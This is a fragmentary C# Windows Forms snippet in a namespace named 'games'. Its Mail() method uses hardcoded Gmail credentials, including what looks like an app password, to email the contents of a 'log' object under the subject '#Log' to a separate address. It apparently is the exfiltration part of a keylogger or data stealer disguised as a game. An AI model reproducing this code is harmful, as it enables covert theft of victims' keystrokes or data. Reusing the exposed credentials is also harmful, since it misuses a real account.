...
namespace games
{
    public partial class Form1 : Form
    {
        ...
        void Mail()
        {
            ...
            istemci.Credentials = new System.Net.NetworkCredential("iremdilekci11@gmail.com", "evqwhhupkykhualp");
            istemci.Port = 587;
            istemci.Host = "smtp.gmail.com";  //smtp.gmail.com
            istemci.EnableSsl = true;

            msj.Body = log.ToString();
            msj.Subject = "#Log";
            msj.From = new MailAddress("iremdilekci11@outlook.com");
            msj.To.Add("iremdlkci17@gmail.com");
